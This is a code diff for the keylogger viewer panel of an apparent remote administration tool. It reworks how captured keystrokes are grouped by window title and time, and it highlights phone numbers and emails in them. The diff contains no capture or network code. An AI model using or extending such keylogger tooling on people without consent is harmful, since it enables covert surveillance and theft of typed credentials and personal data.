@@ -15,25 +15,38 @@
  *  limitations under the License.                                            *
  *                                                                            *
  *****************************************************************************/
-package com.subterranean_security.crimson.viewer.ui.screen.controls.client;
+package com.subterranean_security.crimson.viewer.ui.screen.controlpanels.client.keylogger;
 
+import java.awt.BorderLayout;
 import java.util.ArrayList;
 import java.util.Date;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
-import javax.swing.JTextPane;
+import javax.swing.JPanel;
+import javax.swing.JScrollPane;
+import javax.swing.ScrollPaneConstants;
 
 import com.subterranean_security.crimson.sv.keylogger.Event;
 import com.subterranean_security.crimson.sv.keylogger.Page;
 
-public class KeyLogPane extends JTextPane {
+import javax.swing.Box;
+import javax.swing.BoxLayout;
+
+public class KeyLogPane extends JPanel {
 
 	private static final long serialVersionUID = 1L;
+
+	// TODO rename to something more descriptive
+	private final long paragraphTimeInterval = 60000;
+
 	private boolean highlightPhone = true;
 	private boolean highlightEmail = true;
 	private boolean highlightURL = false;
 	private boolean highlightFileURL = false;
+
+	private ArrayList<KeyLogParagraph> paragraphs = new ArrayList<KeyLogParagraph>();
+	private JPanel stack;
 
 	public boolean isHighlightPhone() {
 		return highlightPhone;
@@ -68,46 +81,56 @@ public class KeyLogPane extends JTextPane {
 	}
 
 	public KeyLogPane() {
-		setEditable(false);
-		setVisible(true);
-		this.setContentType("text/html");
+		setLayout(new BorderLayout(0, 0));
+		JScrollPane scrollPane_8 = new JScrollPane();
+		scrollPane_8.setHorizontalScrollBarPolicy(ScrollPaneConstants.HORIZONTAL_SCROLLBAR_NEVER);
+		add(scrollPane_8, BorderLayout.CENTER);
+		stack = new JPanel();
+		scrollPane_8.setViewportView(stack);
+		stack.setLayout(new BoxLayout(stack, BoxLayout.Y_AXIS));
+
+	}
+
+	private void addParagraph(KeyLogParagraph k) {
+		paragraphs.add(k);
+		stack.add(k);
+
 	}
 
 	public void loadData(Page page) {
-
-		ArrayList<String> lines = new ArrayList<String>();
+		clear();
 
 		String lastTitle = null;
+		Date lastDate = null;
 
 		for (Event k : page.events) {
 			String title = page.titles.get(k.titleOffset);
 			Date date = new Date(page.ref.getTime() + k.timeOffset);
 			if (lastTitle != null && lastTitle.equals(title)) {
+				if (lastDate != null && date.getTime() - lastDate.getTime() < paragraphTimeInterval) {
+					// old paragraph
 
-				// old window
-				lines.set(lines.size() - 1, lines.get(lines.size() - 1) + k.event);
-
-			} else {
-
-				// new window
-				lines.add("<br><strong><font color=\"#c80000\">\"" + title + "\" at " + date.toString()
-						+ "</font></strong>");
-				lines.add(k.event);
-				lastTitle = title;
+					paragraphs.get(paragraphs.size() - 1).append(k.event);
+					continue;
+				}
 
 			}
 
+			// new paragraph
+			KeyLogParagraph klp = new KeyLogParagraph(title + " @ " + date.toString());
+			klp.append(k.event);
+			addParagraph(klp);
+
+			lastTitle = title;
+			lastDate = date;
+
 		}
 
-		StringBuffer text = new StringBuffer();
-		for (String s : lines) {
-			text.append(highlight(s) + "<br>");
-		}
-		setText(text.toString());
 	}
 
 	public void clear() {
-		setText("");
+		paragraphs.clear();
+		stack.removeAll();
 	}
 
 	private String highlight(String s) {
@@ -131,6 +154,10 @@ public class KeyLogPane extends JTextPane {
 
 		}
 		return s;
+	}
+
+	public void updateContent() {
+
 	}
 
 }
